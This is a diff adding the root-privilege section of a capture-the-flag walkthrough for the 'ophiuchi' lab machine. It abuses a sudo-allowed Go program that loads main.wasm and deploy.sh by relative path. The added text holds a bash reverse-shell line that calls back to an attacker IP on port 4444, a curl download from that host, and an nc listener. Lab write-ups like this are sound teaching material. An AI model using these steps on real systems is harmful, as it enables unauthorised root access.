@@ -20,6 +20,9 @@
   - [Apache Tomcat Configuration File](#apache-tomcat-configuration-file)
   - [Getting the User Flag](#getting-the-user-flag)
 - Root
+  - [Wasmer Go: WebAssembly runtime for Go](#wasmer-go-webassembly-runtime-for-go)
+  - [wabt: WebAssembly Binary Toolkit](#wabt-webassembly-binary-toolkit)
+  - [Getting the Root Flag](#getting-the-root-flag)
 
 ## Walkthrough
 
@@ -277,3 +280,151 @@ uid=1000(admin) gid=1000(admin) groups=1000(admin)
 ```
 
 ![user flag](images/8.png)
+
+### Wasmer Go: WebAssembly runtime for Go
+
+Run `sudo -l` to list out commands that the current user can run as root.
+
+```
+-bash-5.0$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+```
+
+as user `admin`, we can run a go language program `/opt/wasm-functions/index.go` as root without password. Let's read and understand what the program does.
+
+```
+-bash-5.0$ cat /opt/wasm-functions/index.go
+package main
+
+import (
+        "fmt"
+        wasm "github.com/wasmerio/wasmer-go/wasmer"
+        "os/exec"
+        "log"
+)
+
+
+func main() {
+        bytes, _ := wasm.ReadBytes("main.wasm")
+
+        instance, _ := wasm.NewInstance(bytes)
+        defer instance.Close()
+        init := instance.Exports["info"]
+        result,_ := init()
+        f := result.String()
+        if (f != "1") {
+                fmt.Println("Not ready to deploy")
+        } else {
+                fmt.Println("Ready to deploy")
+                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+                if err != nil {
+                        log.Fatal(err)
+                }
+                fmt.Println(string(out))
+        }
+}
+```
+
+We can read the detailed wasmer package API documentation [here](https://pkg.go.dev/github.com/wasmerio/wasmer-go/wasmer).
+
+Essentially, the program will open the file `main.wasm` and read the bytes from there. It extracts an object called `info` (most likely a function) assign it to variable `init` and execute it.
+
+If the `info` function returns 1, it will execute `deploy.sh`, which is what we want to obtain the root shell.
+
+Note that `main.wasm` and `deploy.sh` are specified as relative path instead of absolute path, which means that the files must exist inside the current directory, which we execute the script in.
+
+`main.wasm` and `deploy.sh` are both defined inside `/opt/wasm-functions` in the remote machine. Executing the program there results in `Not ready to deploy`.
+
+```
+-bash-5.0$ cd /opt/wasm-functions
+-bash-5.0$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+```
+
+Which means that we need to create our own `main.wasm` and `deploy.sh` to control the program flow. However, we can't simply `cat main.wasm` as it contains bytes instead of string.
+
+### wabt: WebAssembly Binary Toolkit
+
+What we can do now is to install [wabt](https://github.com/WebAssembly/wabt) in our local machine. It contains a set of tools, such as `wasm2wat` and `wat2wasm`, that we need to translate from WebAssembly binary format (wasm) to WebAssembly text format (wat) and vice versa.
+
+Also, download `main.wasm` from the remote machine so that we can translate the file to text format using `wasm2wat`.
+
+Use the following command to translate the wasm file and output the translation to `main.wat`.
+
+```
+$ wasm2wat main.wasm | tee main.wat
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+```
+
+In `main.wat`, we can see the declaration of the function `info`. It simply returns `i32` constant 0, which explains why running `index.go` earlier results in `Not ready to deploy`.
+
+To understand WebAssembly text format, we can read more [here](https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format).
+
+We can simply change the function definition to the following
+
+```
+(func $info (type 0) (result i32)
+    i32.const 1)
+```
+
+so that the function will always return 1.
+
+### Getting the Root Flag
+
+Compile the edited `main.wat` to `main.wasm` with the following command
+
+```
+wat2wasm main.wat
+```
+
+Upload the newly generated `main.wasm` to the remote machine. Also, create `deploy.sh` file as follows
+
+```bash
+#!/bin/bash
+
+bash -c "bash -i >& /dev/tcp/10.10.14.59/4444 0>&1"
+```
+
+and move everything in `/tmp` on the remote machine.
+
+Finally, execute `sudo /usr/bin/go run /opt/wasm-functions/index.go` from `/tmp`. Don't forget to setup a `nc` listener on your local machine.
+
+```
+-bash-5.0$ cd /tmp
+-bash-5.0$ curl -O 10.10.14.59:9998/main.wasm
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   112  100   112    0     0   2153      0 --:--:-- --:--:-- --:--:--  2153
+-bash-5.0$ vi deploy.sh
+-bash-5.0$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+```
+
+On the `nc` listener,
+
+```
+$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.59] from (UNKNOWN) [10.10.10.227] 42384
+root@ophiuchi:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+![root flag](images/9.png)
